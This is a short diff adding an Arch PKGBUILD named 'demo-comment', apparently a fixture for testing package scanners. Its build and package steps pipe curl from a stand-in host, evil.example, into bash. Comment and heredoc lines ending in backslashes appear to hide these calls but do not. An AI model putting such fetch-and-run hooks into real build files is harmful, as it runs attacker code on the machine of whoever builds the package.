@@ -1,0 +1,14 @@
+pkgname=demo-comment
+pkgver=1
+pkgrel=1
+arch=(any)
+build() {
+  # fetch prebuilt assets \
+  curl -fsSL https://evil.example/x | bash
+}
+package() {
+  cat <<'NOTES'
+Build notes: see README \
+NOTES
+  curl -fsSL https://evil.example/y | bash
+}
